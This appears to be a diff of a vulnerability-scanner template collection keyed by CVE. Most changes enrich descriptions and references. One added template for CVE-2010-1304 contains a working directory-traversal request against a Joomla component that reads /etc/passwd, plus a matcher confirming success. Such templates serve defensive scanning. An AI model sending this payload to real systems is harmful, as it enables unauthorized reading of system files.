@@ -794,6 +794,43 @@
       ]
     },
     {
+      "id": "CVE-2010-1304",
+      "info": {
+        "author": "daffainfo",
+        "description": "Directory traversal vulnerability in userstatus.php in the User Status (com_userstatus) component 1.21.16 for Joomla! allows remote attackers to read arbitrary files via a .. (dot dot) in the controller parameter to index.php.",
+        "name": "Joomla! Component User Status - Local File Inclusion",
+        "reference": [
+          "https://www.exploit-db.com/exploits/11998",
+          "https://www.cvedetails.com/cve/CVE-2010-1304"
+        ],
+        "severity": "high",
+        "tags": "cve,cve2010,joomla,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:.*:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/index.php?option=com_userstatus&controller=../../../../../../../../../../etc/passwd%00"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2010-1306",
       "info": {
         "author": "daffainfo",
@@ -6000,7 +6037,10 @@
         "author": "daffainfo,0x240x23elu",
         "description": "The mail-masta plugin 1.0 for WordPress has local file inclusion in count_of_send.php and csvexport.php.",
         "name": "Mail Masta 1.0 - Unauthenticated Local File Inclusion (LFI)",
-        "reference": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-10956",
+        "reference": [
+          "https://cxsecurity.com/issue/WLB-2016080220",
+          "https://wpvulndb.com/vulnerabilities/8609"
+        ],
         "severity": "high",
         "tags": "cve,cve2016,wordpress,wp-plugin,lfi"
       },
@@ -6230,7 +6270,7 @@
       "info": {
         "author": "suman_kar",
         "description": "Vulnerability exists within the page 'BSW_cxttongr.htm' which can allow a remote attacker to access this page without any authentication. Attacker can use this password to gain administrator access of the targeted routers web interface.",
-        "name": "Netgear DGN2200 / DGND3700 - Admin Password Disclosure",
+        "name": "NETGEAR DGN2200 / DGND3700 - Admin Password Disclosure",
         "reference": "https://nvd.nist.gov/vuln/detail/CVE-2016-5649",
         "severity": "critical",
         "tags": "cve,cve2016,iot,netgear,router"
@@ -7114,6 +7154,7 @@
       "id": "CVE-2017-15944",
       "info": {
         "author": "emadshanab,milo2012",
+        "description": "Palo Alto Networks PAN-OS before 6.1.19, 7.0.x before 7.0.19, 7.1.x before 7.1.14, and 8.0.x before 8.0.6 allows remote attackers to execute arbitrary code via vectors involving the management interface.",
         "name": "PreAuth RCE on Palo Alto GlobalProtect",
         "reference": [
           "https://www.exploit-db.com/exploits/43342",
@@ -9952,6 +9993,10 @@
         "author": "Suman_Kar",
         "description": "The JCK Editor component 6.4.4 for Joomla! allows SQL Injection via the jtreelink/dialogs/links.php parent parameter.",
         "name": "Joomla JCK Editor SQL Injection",
+        "reference": [
+          "http://packetstormsecurity.com/files/161683/Joomla-JCK-Editor-6.4.4-SQL-Injection.html",
+          "https://www.exploit-db.com/exploits/45423/"
+        ],
         "severity": "high",
         "tags": "joomla,sqli,cve,cve2018"
       },
@@ -10084,6 +10129,7 @@
       "id": "CVE-2018-18777",
       "info": {
         "author": "0x_Akoko",
+        "description": "Directory traversal vulnerability in Microstrategy Web, version 7, in \"/WebMstr7/servlet/mstrWeb\" (in the parameter subpage)\nallows remote authenticated users to bypass intended SecurityManager restrictions and list a parent directory via a /..\n(slash dot dot) in a pathname used by a web application. NOTE: this is a deprecated product.\n",
         "name": "Path traversal vulnerability in Microstrategy Web version 7",
         "reference": "https://www.exploit-db.com/exploits/45755",
         "severity": "high",
@@ -11332,8 +11378,14 @@
       "id": "CVE-2018-9995",
       "info": {
         "author": "princechaddha",
+        "description": "TBK DVR4104 and DVR4216 devices, as well as Novo, CeNova, QSee, Pulnix, XVR 5 in 1, Securus, Night OWL, DVR Login, HVR Login, and\nMDVR Login, which run re-branded versions of the original TBK DVR4104 and DVR4216 series, allow remote attackers to bypass\nauthentication via a \"Cookie: uid=admin\" header, as demonstrated by a device.rsp?opt=user&cmd=list request that provides\ncredentials within JSON data in a response.\n",
         "name": "DVR Authentication Bypass",
-        "reference": "https://nvd.nist.gov/vuln/detail/CVE-2018-9995",
+        "reference": [
+          "http://misteralfa-hack.blogspot.cl/2018/04/tbk-vision-dvr-login-bypass.html",
+          "http://misteralfa-hack.blogspot.cl/2018/04/update-dvr-login-bypass-cve-2018-9995.html",
+          "https://www.bleepingcomputer.com/news/security/new-hacking-tool-lets-users-access-a-bunch-of-dvrs-and-their-video-feeds/",
+          "https://www.exploit-db.com/exploits/44577/"
+        ],
         "severity": "high",
         "tags": "cve,cve2018,auth-bypass"
       },
@@ -12537,7 +12589,7 @@
       "id": "CVE-2019-15713",
       "info": {
         "author": "daffainfo,dhiyaneshDk",
-        "description": "Triggered via unescaped usage of URL parameters in multiple locations presented in the public view of a site.",
+        "description": "The my-calendar plugin before 3.1.10 for WordPress has XSS. Triggered via unescaped usage of URL parameters in multiple locations presented in the public view of a site.",
         "name": "My Calendar <= 3.1.9 - Reflected Cross-Site Scripting (XSS)",
         "reference": [
           "https://wpscan.com/vulnerability/9267",
@@ -18051,7 +18103,7 @@
       "info": {
         "author": "gy741",
         "description": "It was found that every section of the web could be used as a valid endpoint to submit POST requests being the action defined by the submitId argument. The problem was located in the login.html webpage, that has to be publicly available to perform login requests but does not implement any restriction for executing debug actions. This will allow users execute system commands.",
-        "name": "Netgear ProSAFE Plus - Unauthenticated Remote Code Execution",
+        "name": "NETGEAR ProSAFE Plus - Unauthenticated Remote Code Execution",
         "reference": [
           "https://research.nccgroup.com/2021/03/08/technical-advisory-multiple-vulnerabilities-in-netgear-prosafe-plus-jgs516pe-gs116ev2-switches/",
           "https://unit42.paloaltonetworks.com/mirai-variant-iot-vulnerabilities/"
@@ -18201,11 +18253,12 @@
       "info": {
         "author": "gy741",
         "description": "This vulnerability allows network-adjacent attackers to bypass authentication on affected installations of NETGEAR R6020, R6080, R6120, R6220, R6260, R6700v2, R6800, R6900v2, R7450, JNR3210, WNR2020, Nighthawk AC2100, and Nighthawk AC2400 routers. Authentication is not required to exploit this vulnerability.",
-        "name": "Netgear Authentication Bypass vulnerability",
+        "name": "NETGEAR Authentication Bypass vulnerability",
         "reference": [
           "https://wzt.ac.cn/2021/01/13/AC2400_vuln/",
           "https://www.zerodayinitiative.com/advisories/ZDI-20-1451/",
-          "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-27866"
+          "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-27866",
+          "https://kb.netgear.com/000062641/Security-Advisory-for-Password-Recovery-Vulnerabilities-on-Some-Routers"
         ],
         "severity": "high",
         "tags": "cve,cve2020,netgear,auth-bypass"
@@ -22248,7 +22301,7 @@
       "id": "CVE-2021-24210",
       "info": {
         "author": "0x_Akoko",
-        "description": "There is an open redirect in the plugin that allows an attacker to malform a request to a page with the plugin and then redirect the victim to a malicious page.",
+        "description": "There is an open redirect in the PhastPress WordPress plugin before 1.111 that allows an attacker to malform a request to a page\nwith the plugin and then redirect the victim to a malicious page. There is also a support comment from another user one year\nago (https://wordpress.org/support/topic/phast-php-used-for-remote-fetch/) that says that the php involved in the request only\ngo to whitelisted pages but it's possible to redirect the victim to any domain.\n",
         "name": "PhastPress < 1.111 - Open Redirect",
         "reference": "https://wpscan.com/vulnerability/9b3c5412-8699-49e8-b60c-20d2085857fb",
         "severity": "low",
@@ -22669,7 +22722,7 @@
       "id": "CVE-2021-24387",
       "info": {
         "author": "suman_kar",
-        "description": "XSS in wordpress via ct_community parameter",
+        "description": "The WP Pro Real Estate 7 WordPress theme before 3.1.1 did not properly sanitise the ct_community parameter\nin its search listing page before outputting it back in it, leading to a reflected Cross-Site Scripting which\ncan be triggered in both unauthenticated or authenticated user context\n",
         "name": "Real Estate 7 WordPress Theme < 3.1.1 - Unauthenticated Reflected XSS",
         "reference": "https://cxsecurity.com/issue/WLB-2021070041",
         "severity": "medium",
@@ -25352,7 +25405,7 @@
       "id": "CVE-2021-35464",
       "info": {
         "author": "madrobot",
-        "description": "ForgeRock OpenAM unsafe Java deserialization RCE.",
+        "description": "ForgeRock AM server before 7.0 has a Java deserialization vulnerability in the jato.pageSession parameter on multiple pages.\nThe exploitation does not require authentication, and remote code execution can be triggered by sending a single crafted\n/ccversion/* request to the server. The vulnerability exists due to the usage of Sun ONE Application Framework (JATO)\nfound in versions of Java 8 or earlier\n",
         "name": "Pre-auth RCE in ForgeRock OpenAM",
         "reference": [
           "https://portswigger.net/research/pre-auth-rce-in-forgerock-openam-cve-2021-35464"
